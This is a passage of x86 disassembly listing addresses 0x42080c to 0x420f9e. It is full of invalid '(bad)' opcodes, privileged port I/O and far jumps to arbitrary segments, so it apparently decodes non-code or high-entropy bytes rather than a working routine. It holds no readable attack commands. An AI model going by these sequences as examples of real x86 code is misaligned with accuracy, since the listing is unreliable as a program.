  42080c:	je     0x420840
  42080e:	std    
  42080f:	(bad)  
  420810:	jns    0x420817
  420812:	mov    esi,0xb61e86ed
  420817:	in     eax,0x3b
  420819:	aas    
  42081a:	push   0x21a08c57
  42081f:	pop    ebx
  420820:	inc    edi
  420821:	xor    DWORD PTR [edx+ebx*8+0x22d4d544],edx
  420828:	xchg   esi,eax
  420829:	jl     0x42089c
  42082b:	loope  0x4207fe
  42082d:	ds jne 0x4207c0
  420830:	iret   
  420831:	push   eax
  420832:	je     0x420889
  420834:	scas   eax,DWORD PTR es:[edi]
  420835:	cmp    DWORD PTR [ebx+ebp*2],0xffffffec
  420839:	in     al,dx
  42083a:	(bad)  
  42083b:	std    
  42083c:	push   ds
  42083d:	inc    ebx
  42083e:	rol    bl,0xea
  420841:	adc    al,0xb7
  420843:	and    DWORD PTR [edx+0x7c8f78b9],edi
  420849:	loope  0x4208ba
  42084b:	sub    al,0xb5
  42084d:	std    
  42084e:	pop    edi
  42084f:	xor    bl,bh
  420851:	dec    ecx
  420852:	frstor [ecx]
  420854:	ret    
  420855:	pushf  
  420856:	stc    
  420857:	test   BYTE PTR fs:[eax+0x293f668c],dl
  42085e:	cwde   
  42085f:	mov    eax,0x8bc61805
  420864:	dec    eax
  420865:	jecxz  0x4208de
  420867:	inc    ecx
  420868:	stc    
  420869:	jl     0x420871
  42086b:	dec    ecx
  42086c:	(bad)  
  42086d:	fist   WORD PTR [edi-0x2f]
  420870:	jg     0x4207f2
  420872:	arpl   WORD PTR [ecx+0x57cfdd6],di
  420878:	aad    0x10
  42087a:	cmp    al,0x9b
  42087c:	clc    
  42087d:	imul   esi,DWORD PTR fs:[edx-0x69],0xcf8b3ce0
  420885:	xor    ebx,esi
  420887:	scas   al,BYTE PTR es:[edi]
  420888:	daa    
  420889:	mov    cl,0x77
  42088b:	repnz mov edi,0xd6d6c426
  420891:	inc    ebx
  420892:	rcr    DWORD PTR [eax],0x16
  420895:	mov    cl,0x1c
  420897:	push   esp
  420898:	enter  0x81bc,0x48
  42089c:	and    eax,0x48acc278
  4208a1:	into   
  4208a2:	aad    0x54
  4208a4:	push   ss
  4208a5:	xor    al,0xaf
  4208a7:	test   DWORD PTR [edi-0x114fa4ca],esp
  4208ad:	clc    
  4208ae:	xacquire xchg BYTE PTR [esp+ecx*8],bh
  4208b2:	mov    ds:0xc25a24e9,al
  4208b7:	mov    edi,0x3fcb3476
  4208bc:	pop    ss
  4208bd:	sub    BYTE PTR [edx+ecx*1],0x19
  4208c1:	enter  0x6c28,0x57
  4208c5:	sbb    al,0x5a
  4208c7:	and    eax,0xea334d42
  4208cc:	xchg   edi,eax
  4208cd:	(bad)  
  4208cf:	push   es
  4208d0:	adc    eax,0x595bcf67
  4208d5:	xor    ebp,DWORD PTR [eax-0x2d9e4d5f]
  4208db:	sbb    dl,BYTE PTR gs:[edi-0x3]
  4208df:	mov    esp,0xdc8a1159
  4208e4:	loopne 0x42089e
  4208e6:	test   al,0xe0
  4208e8:	dec    edi
  4208e9:	dec    eax
  4208ea:	cdq    
  4208eb:	in     eax,dx
  4208ec:	loopne 0x4208bd
  4208ee:	inc    eax
  4208ef:	mov    dl,0xa7
  4208f1:	scas   al,BYTE PTR es:[edi]
  4208f2:	jmp    0x59a6:0x3da96ca6
  4208f9:	xchg   ch,cl
  4208fb:	sar    BYTE PTR ds:[eax],0x4d
  4208ff:	int    0x96
  420901:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420902:	scas   al,BYTE PTR es:[edi]
  420903:	iret   
  420904:	scas   al,BYTE PTR es:[edi]
  420905:	pop    ss
  420906:	jp     0x4208d8
  420908:	aad    0xaf
  42090a:	xchg   DWORD PTR [edx+0xd7b1f26],edi
  420910:	xchg   bh,dh
  420912:	nop
  420913:	ret    
  420914:	xchg   ebp,eax
  420915:	pop    ebp
  420916:	outs   dx,DWORD PTR ds:[esi]
  420917:	scas   al,BYTE PTR es:[edi]
  420918:	mov    BYTE PTR [eax-0x26fa6943],bh
  42091e:	jbe    0x4208f3
  420920:	ret    0xd66d
  420923:	and    ecx,DWORD PTR [ebx+0xc]
  420926:	test   ah,dl
  420928:	imul   edx,ebx,0x6d
  42092b:	dec    esi
  42092c:	fidivr DWORD PTR ds:[esi+0x7b]
  420930:	les    ecx,FWORD PTR [edx+0x336dcbde]
  420936:	mov    esi,0xa918f52d
  42093b:	int    0xa6
  42093d:	push   ss
  42093e:	ss stos DWORD PTR es:[edi],eax
  420940:	hlt    
  420941:	xchg   edi,eax
  420942:	cs pop ds
  420944:	xor    BYTE PTR [ecx],ah
  420946:	and    al,0x51
  420948:	aas    
  420949:	scas   al,BYTE PTR es:[edi]
  42094a:	lods   al,BYTE PTR ds:[esi]
  42094b:	pushf  
  42094c:	int    0xd8
  42094e:	cmp    al,0xa3
  420950:	loopne 0x4209ad
  420952:	jmp    0x4209c9
  420954:	push   esp
  420955:	retf   
  420956:	sub    DWORD PTR [ebx-0x68aa4823],ebp
  42095c:	mov    bl,0x35
  42095e:	jge    0x4209db
  420960:	mov    cl,0x19
  420962:	mov    al,BYTE PTR [ebx+edi*1]
  420965:	std    
  420966:	imul   eax,DWORD PTR [ebx+0x41],0xffffffc6
  42096a:	dec    eax
  42096b:	jge    0x42092b
  42096d:	ss (bad) 
  42096f:	(bad)  
  420971:	and    ebp,DWORD PTR [eax+0x38e048d9]
  420977:	ret    0x86ae
  42097a:	dec    esi
  42097b:	mov    dh,0x62
  42097d:	lds    esp,FWORD PTR [edi]
  42097f:	or     BYTE PTR [edi],cl
  420981:	arpl   WORD PTR [ecx+ebp*2],si
  420984:	xchg   DWORD PTR [eax],esi
  420986:	ror    BYTE PTR [edi-0x19],0x1d
  42098a:	inc    esp
  42098b:	das    
  42098c:	mov    DWORD PTR cs:[ebx-0x19f2a12d],ebx
  420993:	dec    ecx
  420994:	adc    bl,BYTE PTR [esi]
  420996:	mov    ebx,0x7930038f
  42099b:	div    BYTE PTR [eax]
  42099d:	or     BYTE PTR [ebp+ebp*2-0x63ee3f74],bl
  4209a4:	adc    eax,0x6dc25352
  4209a9:	cmc    
  4209aa:	cmp    eax,0xed8484c2
  4209af:	or     BYTE PTR [esi-0x38],bh
  4209b2:	dec    esi
  4209b3:	pop    ebx
  4209b4:	pop    ebx
  4209b5:	scas   eax,DWORD PTR es:[edi]
  4209b6:	test   BYTE PTR [esi],dh
  4209b8:	sbb    eax,0x562337c1
  4209bd:	cs mov al,0x7d
  4209c0:	push   ecx
  4209c1:	adc    dh,al
  4209c3:	ins    DWORD PTR es:[edi],dx
  4209c4:	add    ch,BYTE PTR [ecx-0x4056aa47]
  4209ca:	sub    DWORD PTR [edi+eiz*8-0x78fcd27a],ebp
  4209d1:	fs ins DWORD PTR es:[edi],dx
  4209d3:	xor    eax,DWORD PTR [ecx+0x2f68a24a]
  4209d9:	mov    WORD PTR [edi+ebp*4-0x71],ss
  4209dd:	outs   dx,BYTE PTR ds:[esi]
  4209de:	add    esi,esi
  4209e0:	sar    BYTE PTR [edi+0x49e0cdf5],1
  4209e6:	xchg   DWORD PTR [edx],esi
  4209e8:	fst    QWORD PTR [esi+0x27]
  4209eb:	xchg   ecx,eax
  4209ec:	iret   
  4209ed:	jo     0x4209a7
  4209ef:	xor    ch,bh
  4209f1:	mov    ecx,0xf0d0dd53
  4209f6:	call   DWORD PTR [ebp+0x764083a]
  4209fc:	outs   dx,BYTE PTR ds:[esi]
  4209fd:	ds ret 0xbd62
  420a01:	imul   eax,DWORD PTR [edx],0x25
  420a04:	out    0x78,eax
  420a06:	jns    0x420a7f
  420a08:	pushf  
  420a09:	cld    
  420a0a:	out    dx,al
  420a0b:	rcl    ebx,cl
  420a0d:	xor    eax,0xc591dc68
  420a12:	retf   0xd4fe
  420a15:	(bad)  
  420a17:	pop    ds
  420a18:	scas   eax,DWORD PTR es:[edi]
  420a19:	jg     0x4209f9
  420a1b:	add    BYTE PTR [eax],dh
  420a1d:	ret    0x930b
  420a20:	add    eax,0x17d0180b
  420a25:	outs   dx,DWORD PTR ds:[esi]
  420a26:	(bad)  
  420a27:	mov    bh,0x79
  420a29:	popa   
  420a2a:	or     ah,BYTE PTR [ecx]
  420a2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a2d:	loope  0x4209f8
  420a2f:	sub    al,0xca
  420a31:	inc    ebx
  420a32:	mov    eax,0xb59da8aa
  420a37:	cli    
  420a38:	test   al,0xd3
  420a3a:	adc    dl,BYTE PTR [esp+ecx*1]
  420a3d:	div    BYTE PTR [ebx+0x291c42b1]
  420a43:	jns    0x4209d6
  420a45:	xor    edx,DWORD PTR [ebx]
  420a47:	sbb    ebx,ecx
  420a49:	popa   
  420a4a:	lahf   
  420a4b:	or     DWORD PTR [esi-0x7b24d25f],eax
  420a51:	cld    
  420a52:	lea    ebp,[ecx+0xe]
  420a55:	lahf   
  420a56:	sub    BYTE PTR [edx-0x14],dl
  420a59:	or     al,0xb9
  420a5b:	test   ah,bh
  420a5d:	push   ds
  420a5e:	mul    edi
  420a60:	rcl    DWORD PTR [eax+esi*8],1
  420a63:	retf   0x5ea0
  420a66:	mov    al,0xab
  420a68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a69:	(bad)  
  420a6a:	push   edi
  420a6b:	fild   QWORD PTR [ebx-0x10]
  420a6e:	sbb    ah,BYTE PTR [ebx-0x20b66f99]
  420a74:	mov    ah,0x19
  420a76:	int    0x25
  420a78:	cmp    ah,BYTE PTR [ecx]
  420a7a:	es xchg ebp,eax
  420a7c:	pop    eax
  420a7d:	xchg   DWORD PTR [edi+0x1d],ecx
  420a80:	push   ebp
  420a81:	fcom   DWORD PTR [ebx]
  420a83:	adc    esi,DWORD PTR [esi]
  420a85:	loopne 0x420ab0
  420a87:	aad    0x4f
  420a89:	lea    eax,[ebp-0x48]
  420a8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a8d:	shl    DWORD PTR [ebp-0x7c],1
  420a90:	add    BYTE PTR [eax-0x40],al
  420a93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a94:	and    al,0xd4
  420a96:	ror    eax,cl
  420a98:	in     eax,dx
  420a99:	add    eax,0x3283afd7
  420a9e:	dec    ebp
  420a9f:	nop
  420aa0:	dec    edi
  420aa1:	jle    0x420ac1
  420aa3:	pop    eax
  420aa4:	or     al,BYTE PTR [ebx]
  420aa6:	les    esp,FWORD PTR [esi]
  420aa8:	push   ebx
  420aa9:	lahf   
  420aaa:	and    dh,cl
  420aac:	pop    edi
  420aad:	repz jl 0x420a4a
  420ab0:	mov    ebx,0x66e0924f
  420ab5:	sbb    eax,0x4f76c57a
  420aba:	out    dx,eax
  420abb:	push   cs
  420abc:	pop    ss
  420abd:	jnp    0x420b37
  420abf:	cdq    
  420ac0:	pop    ecx
  420ac1:	lock bound esp,QWORD PTR [edx]
  420ac4:	es sbb esp,ebp
  420ac7:	imul   esi,DWORD PTR [ebp+0x4872ed44],0xfffffff6
  420ace:	push   ds
  420acf:	retf   
  420ad0:	push   0xc6038623
  420ad5:	data16 fldcw WORD PTR [ecx]
  420ad8:	cmp    edi,edx
  420ada:	int3   
  420adb:	mov    ecx,0x98090133
  420ae0:	in     al,0xdf
  420ae2:	out    0x6e,eax
  420ae4:	mov    bh,0xb0
  420ae6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ae7:	mov    ch,0xe8
  420ae9:	add    edx,DWORD PTR [ebx]
  420aeb:	sbb    BYTE PTR ds:0x8fb4149d,dl
  420af1:	out    dx,eax
  420af2:	and    al,0x6e
  420af4:	jae    0x420b41
  420af6:	xchg   esp,eax
  420af7:	xchg   ecx,eax
  420af8:	mov    cl,0xcf
  420afa:	popa   
  420afb:	scas   eax,DWORD PTR es:[edi]
  420afc:	ins    BYTE PTR es:[edi],dx
  420afd:	ins    DWORD PTR es:[edi],dx
  420afe:	and    BYTE PTR [esi],ch
  420b00:	fwait
  420b01:	pushf  
  420b02:	iret   
  420b03:	pusha  
  420b04:	imul   ebp,ebx,0x36
  420b07:	cdq    
  420b08:	xor    eax,DWORD PTR [ebp+0x5f8640d7]
  420b0e:	pusha  
  420b0f:	fisubr DWORD PTR fs:[ebp-0x7a810722]
  420b16:	ror    dh,0x5b
  420b19:	cmp    DWORD PTR [eax+ebp*8],0x996161a8
  420b20:	cmp    al,0x8e
  420b22:	stos   DWORD PTR es:[edi],eax
  420b23:	mov    bl,bh
  420b25:	jecxz  0x420b31
  420b27:	shl    BYTE PTR [edx],1
  420b29:	arpl   cx,dx
  420b2b:	jnp    0x420acc
  420b2d:	jmp    0x71f0:0x394ea9a9
  420b34:	and    al,0x7e
  420b36:	inc    edi
  420b37:	sar    ah,0x6a
  420b3a:	pusha  
  420b3b:	icebp  
  420b3c:	das    
  420b3d:	les    ecx,FWORD PTR [ebx-0x59]
  420b40:	dec    eax
  420b41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b42:	sub    ah,0x8b
  420b45:	adc    al,BYTE PTR [edi-0x7c]
  420b48:	xor    BYTE PTR [ecx+ecx*8],ah
  420b4b:	loop   0x420b53
  420b4d:	pop    edi
  420b4e:	or     DWORD PTR [ecx+0x2a],0xe5f1f7d9
  420b55:	mov    cl,0x48
  420b57:	lds    eax,FWORD PTR [ebp+0x63]
  420b5a:	dec    ecx
  420b5b:	sbb    dh,cl
  420b5d:	lods   al,BYTE PTR ds:[esi]
  420b5e:	test   DWORD PTR [ecx-0x68b7efb9],0xdca248a
  420b68:	sub    BYTE PTR [esi-0x1fa1c1ee],ch
  420b6e:	jbe    0x420b2b
  420b70:	jae    0x420b92
  420b72:	or     eax,0x74a923e
  420b77:	sbb    edi,DWORD PTR [eax*1-0x458740e2]
  420b7e:	jae    0x420bdc
  420b80:	fwait
  420b81:	test   eax,0xd196b28e
  420b86:	in     al,0xc6
  420b88:	cmp    bh,bl
  420b8a:	aad    0x6
  420b8c:	push   es
  420b8d:	out    dx,eax
  420b8e:	call   0x70db:0x42b86e48
  420b95:	(bad)  
  420b96:	mov    ebp,0x777c2cde
  420b9b:	mov    ebp,0x5e709827
  420ba0:	(bad)  
  420ba1:	bound  eax,QWORD PTR [ebp+0x4d244a9f]
  420ba7:	retf   
  420ba8:	(bad)  
  420ba9:	dec    ecx
  420baa:	jmp    0x420bac
  420bac:	jge    0x420c01
  420bae:	loop   0x420bf7
  420bb0:	push   esp
  420bb1:	pop    eax
  420bb2:	rol    DWORD PTR [edi-0x2e4e95f7],cl
  420bb8:	pop    esi
  420bb9:	dec    ebx
  420bba:	dec    esi
  420bbb:	ret    
  420bbc:	mov    dl,0xd1
  420bbe:	jmp    0xc8e1:0x9309e0af
  420bc5:	stos   DWORD PTR es:[edi],eax
  420bc6:	lds    ecx,FWORD PTR [eax+0x5e88eff0]
  420bcc:	inc    edi
  420bcd:	sbb    DWORD PTR [esi+esi*1-0x20],ebx
  420bd1:	cmp    BYTE PTR [ecx+0x3c],0xd4
  420bd5:	and    BYTE PTR [ecx+ebx*4-0x1ee23499],ch
  420bdc:	lods   eax,DWORD PTR ds:[esi]
  420bdd:	push   eax
  420bde:	xor    eax,0x6e0378a7
  420be3:	retf   
  420be4:	sbb    BYTE PTR [eax+eiz*4+0x37],ch
  420be8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420be9:	mov    ds:0xfdf458ac,al
  420bee:	outs   dx,BYTE PTR ds:[esi]
  420bef:	jne    0x420c62
  420bf1:	or     BYTE PTR [ebx-0x700bfad8],al
  420bf7:	out    0x14,al
  420bf9:	add    eax,DWORD PTR [ecx-0x6a]
  420bfc:	inc    ebx
  420bfd:	popa   
  420bfe:	mov    bl,0xe9
  420c00:	clc    
  420c01:	mov    DWORD PTR [edx],ebp
  420c03:	(bad)  
  420c04:	fstp   DWORD PTR [eax+ebp*1-0x50061eda]
  420c0b:	mov    esp,0x561833aa
  420c10:	icebp  
  420c11:	pop    es
  420c12:	and    ebx,DWORD PTR [esi]
  420c14:	fs mov edx,0x87d0763b
  420c1a:	shl    BYTE PTR [ebx+0x5b92e39],0xc1
  420c21:	push   ebp
  420c22:	popf   
  420c23:	sub    al,0xd4
  420c25:	(bad)  
  420c26:	dec    ebx
  420c27:	mov    edi,0x3e5bcba6
  420c2c:	mov    DWORD PTR [eax+0xa],ebp
  420c2f:	fcompp 
  420c31:	retf   
  420c32:	sbb    BYTE PTR [esi*1+0x9304c13],dl
  420c39:	jmp    0x420c43
  420c3b:	push   edi
  420c3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c3d:	or     DWORD PTR [edx+ecx*8-0x31],ebp
  420c41:	xor    esi,esi
  420c43:	or     dh,dl
  420c45:	and    eax,0xcd83c57d
  420c4a:	outs   dx,DWORD PTR ds:[esi]
  420c4b:	call   0xfa55:0xf22e8aa3
  420c52:	jns    0x420bd8
  420c54:	mov    ds:0x5d516c83,al
  420c59:	pop    edi
  420c5a:	fsubr  DWORD PTR [esi+0x6458ccb9]
  420c60:	daa    
  420c61:	push   es
  420c62:	out    0x4f,al
  420c64:	fadd   st,st(7)
  420c66:	ins    BYTE PTR es:[edi],dx
  420c67:	jmp    0xb7d7f73a
  420c6c:	test   al,0x53
  420c6e:	adc    al,0x6b
  420c70:	fisub  DWORD PTR [esp+eiz*4+0x36f48038]
  420c77:	xchg   ebp,eax
  420c78:	outs   dx,BYTE PTR ds:[esi]
  420c79:	pop    ebp
  420c7a:	cmp    eax,ebp
  420c7c:	sbb    ebx,DWORD PTR [esi+ebx*1]
  420c7f:	dec    esp
  420c80:	mov    cl,0x62
  420c82:	enter  0x34e0,0xf8
  420c86:	fcomp  QWORD PTR [edx-0x25]
  420c89:	daa    
  420c8a:	jecxz  0x420d00
  420c8c:	std    
  420c8d:	mov    ?,WORD PTR ss:[ebp-0x23f3e81f]
  420c94:	sbb    bl,BYTE PTR [edi+ecx*4+0x2e]
  420c98:	mov    dl,0xba
  420c9a:	sub    edi,edi
  420c9c:	add    cl,cl
  420c9e:	in     al,0x33
  420ca0:	jecxz  0x420d19
  420ca2:	scas   eax,DWORD PTR es:[edi]
  420ca3:	sbb    eax,0x3b4f9952
  420ca8:	push   ds
  420ca9:	hlt    
  420caa:	std    
  420cab:	sbb    edi,edx
  420cad:	cli    
  420cae:	adc    bh,BYTE PTR [edi+0x5827fa6f]
  420cb4:	adc    al,0x49
  420cb6:	ficom  DWORD PTR [edx]
  420cb8:	retf   0x9a7f
  420cbb:	push   esp
  420cbc:	or     al,0xe2
  420cbe:	ds jl  0x420c61
  420cc1:	ror    BYTE PTR [edi+0xa],1
  420cc4:	sbb    eax,0xaf8ed60e
  420cc9:	fld    TBYTE PTR [esi+0x7c6b9209]
  420ccf:	dec    ebx
  420cd0:	mov    edi,0xe60ddfe9
  420cd5:	and    DWORD PTR [esp+ecx*8],eax
  420cd8:	(bad)
  420cdb:	inc    edi
  420cdc:	sub    esi,DWORD PTR [esp+esi*4+0x3d592db1]
  420ce3:	loope  0x420ce6
  420ce5:	push   ebp
  420ce6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ce7:	mov    DWORD PTR [ebp+0x455aff5],0xf82b5257
  420cf1:	int3   
  420cf2:	cld    
  420cf3:	fisttp DWORD PTR [eax+eiz*1]
  420cf6:	shl    ebp,0x27
  420cf9:	mov    eax,0x71d34089
  420cfe:	jle    0x420cec
  420d00:	xchg   edx,eax
  420d01:	mov    dh,0xd1
  420d03:	xchg   BYTE PTR [ebx],ch
  420d05:	mov    edx,0x42d4351e
  420d0a:	inc    edx
  420d0b:	cmp    DWORD PTR [edx],0xcdb7b4be
  420d11:	fistp  QWORD PTR [ebp+edi*8-0x70]
  420d15:	dec    ebx
  420d16:	out    0xfa,al
  420d18:	icebp  
  420d19:	lea    ecx,[esp+eax*1-0x15]
  420d1d:	cmc    
  420d1e:	cmp    al,0xda
  420d20:	dec    esp
  420d21:	call   0xaa797a8d
  420d26:	sahf   
  420d27:	jecxz  0x420d96
  420d29:	(bad)  
  420d2a:	jp     0x420d2a
  420d2c:	jo     0x420ce4
  420d2e:	mov    ah,0xb2
  420d30:	loop   0x420d3d
  420d32:	and    DWORD PTR [ecx-0x33e8519a],ebx
  420d38:	mov    ebx,0xce954a7e
  420d3d:	xor    cl,BYTE PTR [edx+0x5a]
  420d40:	repz jbe 0x420cf9
  420d43:	mov    dl,0x61
  420d45:	mov    ebp,0x70d85dfa
  420d4a:	ds nop
  420d4c:	stos   DWORD PTR es:[edi],eax
  420d4d:	xchg   ecx,ebp
  420d4f:	and    ah,BYTE PTR ds:0x7b81fd6e
  420d55:	fdiv   DWORD PTR [ecx+edi*2]
  420d58:	loopne 0x420d06
  420d5a:	(bad)  
  420d5b:	xor    esp,DWORD PTR [ebx-0x27]
  420d5e:	arpl   WORD PTR [ebx+0x39],bx
  420d61:	inc    eax
  420d62:	loope  0x420d26
  420d64:	fwait
  420d65:	hlt    
  420d66:	out    dx,eax
  420d67:	pushw  es
  420d69:	adc    dh,ah
  420d6b:	dec    esi
  420d6c:	sub    al,0xbf
  420d6e:	fbld   TBYTE PTR [edx-0x41ada085]
  420d74:	outs   dx,DWORD PTR ds:[esi]
  420d75:	jmp    0x7736f897
  420d7a:	dec    edi
  420d7b:	mov    al,ds:0x260068fc
  420d80:	(bad)  
  420d81:	aam    0x6e
  420d83:	pop    esi
  420d84:	shl    DWORD PTR [ebx],cl
  420d86:	(bad)  
  420d87:	and    al,0xc4
  420d89:	push   eax
  420d8a:	cmp    DWORD PTR [ebp-0x63],ebx
  420d8d:	test   DWORD PTR [edx],ecx
  420d8f:	pop    esp
  420d90:	sahf   
  420d91:	shl    DWORD PTR [esi-0x5af5770a],0xc3
  420d98:	sbb    ch,BYTE PTR [ebx+esi*1]
  420d9b:	xor    al,0x5b
  420d9d:	jae    0x420dc8
  420d9f:	xchg   ecx,eax
  420da0:	add    DWORD PTR cs:[ecx],0x4d
  420da4:	cld    
  420da5:	cmp    ch,BYTE PTR [esi-0x49]
  420da8:	out    dx,eax
  420da9:	push   eax
  420daa:	dec    edi
  420dab:	js     0x420e1a
  420dad:	inc    edx
  420dae:	mov    dh,0x7
  420db0:	(bad)  
  420db1:	push   ds
  420db2:	(bad)  
  420db3:	outs   dx,DWORD PTR ds:[esi]
  420db4:	es out dx,al
  420db6:	pusha  
  420db7:	iret   
  420db8:	or     BYTE PTR [ebp-0x54],dl
  420dbb:	loop   0x420e14
  420dbd:	retf   
  420dbe:	leave  
  420dbf:	cmp    al,0x27
  420dc1:	mov    esp,DWORD PTR [ebx+edi*1+0xb]
  420dc5:	cs out 0x3c,eax
  420dc8:	scas   al,BYTE PTR es:[edi]
  420dc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420dca:	push   ss
  420dcb:	cli    
  420dcc:	cdq    
  420dcd:	adc    dh,BYTE PTR [ecx+0x47510e42]
  420dd3:	mov    ah,0xaf
  420dd5:	popa   
  420dd6:	or     BYTE PTR [esi+esi*8+0x49],ah
  420dda:	jnp    0x420d99
  420ddc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ddd:	arpl   WORD PTR [ebx+edi*2-0x3e],si
  420de1:	sub    esi,ebp
  420de3:	jmp    0xb9ff:0xfd3f222
  420dea:	out    0x94,eax
  420dec:	pop    es
  420ded:	pop    eax
  420dee:	jg     0x420dd8
  420df0:	pop    ds
  420df1:	data16 loope 0x420d79
  420df4:	in     al,0x7f
  420df6:	add    edi,ebx
  420df8:	stos   BYTE PTR es:[edi],al
  420df9:	and    esp,DWORD PTR [esi+0xf89dd87]
  420dff:	ret    
  420e00:	xchg   esi,eax
  420e01:	push   es
  420e02:	pop    edi
  420e03:	mov    ds:0xf11934a4,eax
  420e08:	popa   
  420e09:	test   al,0x48
  420e0b:	mov    dh,0x8c
  420e0d:	jmp    0xecf9:0x60edd50c
  420e14:	dec    edx
  420e15:	cli    
  420e16:	mov    DWORD PTR [ecx+0x8],esi
  420e19:	pop    es
  420e1a:	or     esi,DWORD PTR [esi]
  420e1c:	cmp    dl,BYTE PTR [edi-0x10e6f8cc]
  420e22:	or     ah,BYTE PTR [ecx+ebx*1+0x24]
  420e26:	add    eax,ebx
  420e28:	ins    BYTE PTR es:[edi],dx
  420e29:	ret    
  420e2a:	aam    0xd
  420e2c:	test   BYTE PTR [eax+0x52b89659],cl
  420e32:	mov    esp,0xe607d89e
  420e37:	push   es
  420e38:	out    dx,eax
  420e39:	xchg   edi,eax
  420e3a:	inc    ecx
  420e3b:	scas   eax,DWORD PTR es:[edi]
  420e3c:	mov    edx,0xf696dc0e
  420e41:	jmp    0x420df0
  420e43:	cmp    cl,ch
  420e45:	fist   DWORD PTR [eax+0x40]
  420e48:	sbb    DWORD PTR [esi+0x5eae7b3f],eax
  420e4e:	push   esi
  420e4f:	jp     0x420e51
  420e51:	fimul  WORD PTR [ebp+0x58]
  420e54:	fld    TBYTE PTR [edi]
  420e56:	aad    0xf2
  420e58:	mov    ch,0x96
  420e5a:	inc    eax
  420e5b:	sar    DWORD PTR [edi-0x736dbda8],1
  420e61:	xchg   ecx,eax
  420e62:	mov    ah,0xc2
  420e64:	or     DWORD PTR [ecx],esp
  420e66:	mov    al,0x4b
  420e68:	out    0x1d,al
  420e6a:	mov    esi,0xc232c2ce
  420e6f:	jle    0x420e3c
  420e71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e72:	aaa    
  420e73:	jle    0x420e9b
  420e75:	xor    eax,0xe3da6c51
  420e7a:	in     eax,0xa3
  420e7c:	jbe    0x420e5b
  420e7e:	mov    ebp,0x99fb7151
  420e83:	and    DWORD PTR ds:0x98b756d2,edi
  420e89:	or     ebp,esp
  420e8b:	sbb    DWORD PTR [ebp-0x7a021bc7],0x5dc32c5
  420e95:	(bad)  
  420e97:	imul   eax,DWORD PTR [eax+0x78849635],0xfbaa5a4c
  420ea1:	push   ecx
  420ea2:	iret   
  420ea3:	push   0x6de3d86c
  420ea8:	pop    ebx
  420ea9:	sbb    bl,dh
  420eab:	test   BYTE PTR [ebx-0x187fb82f],bh
  420eb1:	cmp    edx,DWORD PTR [eax+0x6]
  420eb4:	nop
  420eb5:	xor    BYTE PTR [ebp+0x42e922cd],ch
  420ebb:	pop    edi
  420ebc:	pop    eax
  420ebd:	jmp    0x5482ecd5
  420ec2:	outs   dx,BYTE PTR ds:[esi]
  420ec3:	xor    edi,DWORD PTR [ebx+ecx*1]
  420ec6:	je     0x420e5e
  420ec8:	jno    0x420ec4
  420eca:	or     DWORD PTR [eax],0xffffff9b
  420ecd:	mov    ebx,DWORD PTR [ecx-0x171dd23c]
  420ed3:	imul   BYTE PTR [ecx]
  420ed5:	clc    
  420ed6:	sahf   
  420ed7:	mov    eax,ds:0x76b3316a
  420edc:	inc    edi
  420edd:	aad    0xc8
  420edf:	(bad)  
  420ee0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ee1:	dec    ecx
  420ee2:	xchg   esi,eax
  420ee3:	hlt    
  420ee4:	jg     0x420ec7
  420ee6:	mov    cs,WORD PTR [esi+0x7bc70ccb]
  420eec:	or     BYTE PTR [edi+0x19],al
  420eef:	lea    edx,[ecx]
  420ef1:	mov    ah,BYTE PTR [ebx]
  420ef3:	scas   al,BYTE PTR es:[edi]
  420ef4:	mov    edx,0xb3c41195
  420ef9:	pushf  
  420efa:	dec    ebx
  420efb:	in     eax,0xfb
  420efd:	mov    eax,0x30327e44
  420f02:	push   ecx
  420f03:	cmp    DWORD PTR [ebp+0x4],ebp
  420f06:	cdq    
  420f07:	(bad)  
  420f08:	sub    DWORD PTR [edx+eiz*4],edi
  420f0b:	xchg   edi,eax
  420f0c:	inc    esp
  420f0d:	fisttp DWORD PTR [edx+0x65c2cbd1]
  420f13:	dec    eax
  420f14:	mov    al,0x97
  420f16:	jbe    0x420ecf
  420f18:	fdiv   st(0),st
  420f1a:	mov    ecx,0x29c96ab
  420f1f:	inc    BYTE PTR [edi+0x483e07b4]
  420f25:	fsubr  st,st(0)
  420f27:	pop    ebp
  420f28:	xor    BYTE PTR [edx+0x63],ch
  420f2b:	push   ss
  420f2c:	(bad)  
  420f2d:	pcmpeqw mm7,QWORD PTR [edi+edi*8+0x18]
  420f32:	push   ss
  420f33:	sub    eax,0x1a4d0816
  420f38:	shl    ecx,0xcc
  420f3b:	mov    al,ds:0x2c5b3835
  420f40:	sbb    esi,ebx
  420f42:	push   edi
  420f43:	pusha  
  420f44:	mov    esp,0xd22b96d5
  420f49:	int    0x5f
  420f4b:	jecxz  0x420fbd
  420f4d:	pop    edx
  420f4e:	ins    BYTE PTR es:[edi],dx
  420f4f:	xor    al,0xd3
  420f51:	fst    QWORD PTR [edx-0x39b70b8a]
  420f57:	mov    edi,0xe3788f9e
  420f5c:	push   ebp
  420f5d:	jmp    0x70ebc7ae
  420f62:	leave  
  420f63:	test   BYTE PTR ds:[ecx+0xcb7b358],cl
  420f6a:	cmp    eax,0x70e93580
  420f6f:	mov    edi,0x1ffc64aa
  420f74:	jns    0x420f91
  420f76:	jns    0x420fde
  420f78:	mov    eax,0x1cab6513
  420f7d:	inc    ecx
  420f7e:	mov    cl,0xc5
  420f80:	bswap  ebx
  420f82:	push   ebx
  420f83:	loop   0x420f6a
  420f85:	push   cs
  420f86:	xchg   esp,eax
  420f87:	out    0xed,eax
  420f89:	ret    0x4d89
  420f8c:	daa    
  420f8d:	test   DWORD PTR [eax+0x14],0x711b9ef9
  420f94:	xor    edx,ecx
  420f96:	add    eax,esp
  420f98:	pop    ebx
  420f99:	js     0x420fdc
  420f9b:	or     eax,ecx
  420f9d:	pop    eax
  420f9e:	jo     0x420fab
